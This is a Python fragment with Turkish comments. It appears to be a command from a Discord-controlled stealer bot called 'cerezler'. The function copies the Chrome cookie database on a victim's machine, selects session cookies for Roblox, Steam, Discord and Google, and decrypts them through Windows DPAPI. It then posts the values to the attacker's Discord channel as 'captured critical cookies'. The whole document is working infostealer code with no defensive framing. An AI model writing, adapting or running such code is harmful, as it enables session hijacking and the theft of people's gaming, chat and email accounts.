@client.command(name="cerezler")
async def get_browser_cookies(ctx):
  """Chrome çerez veritabanından Roblox, Steam ve diğer kritik sitelerin çerezlerini çeker."""
  try:
    import sqlite3
    try:
      import win32crypt
    except ImportError:
      win32crypt = None

    local_app = os.environ.get("LOCALAPPDATA", "")
    cookie_path = os.path.join(
        local_app, r"Google\Chrome\User Data\Default\Network\Cookies"
    )
    if not os.path.exists(cookie_path):
      cookie_path = os.path.join(
          local_app, r"Google\Chrome\User Data\Default\Cookies"
      )

    if not os.path.exists(cookie_path):
      await ctx.send("❌ Chrome çerez dosyası bulunamadı.")
      return

    temp_db = "temp_cookies.db"
    shutil.copyfile(cookie_path, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    
    # Roblox, Steam, Google, Discord gibi hedef platformların çerezlerini filtreleyelim
    cursor.execute("""
      SELECT host_key, name, encrypted_value FROM cookies 
      WHERE host_key LIKE '%roblox.com%' 
         OR host_key LIKE '%steampowered.com%' 
         OR host_key LIKE '%steamcommunity.com%' 
         OR host_key LIKE '%discord.com%' 
         OR host_key LIKE '%google.com%'
      LIMIT 30
    """)
    
    cookie_results = []
    for host, name, enc_value in cursor.fetchall():
      val = "Şifreli (DPAPI)"
      if win32crypt and enc_value:
        try:
          decrypted = win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1]
          val = decrypted.decode("utf-8", errors="ignore")
        except:
          pass
      cookie_results.append(f"Site: {host} | İsim: {name} | Değer: {val}")

    conn.close()
    try:
      os.remove(temp_db)
    except:
      pass

    if cookie_results:
      output = "\n".join(cookie_results)
      if len(output) > 1900:
        output = output[:1900] + "\n..."
      await ctx.send(f"🍪 **Yakalanan Kritik Çerezler (Roblox, Steam vb.):**\n```text\n{output}\n```")
    else:
      await ctx.send("⚠️ Hedef sitelere ait aktif çerez bulunamadı.")

  except Exception as e:
    await ctx.send(f"❌ Çerez çekme hatası: `{e}`")


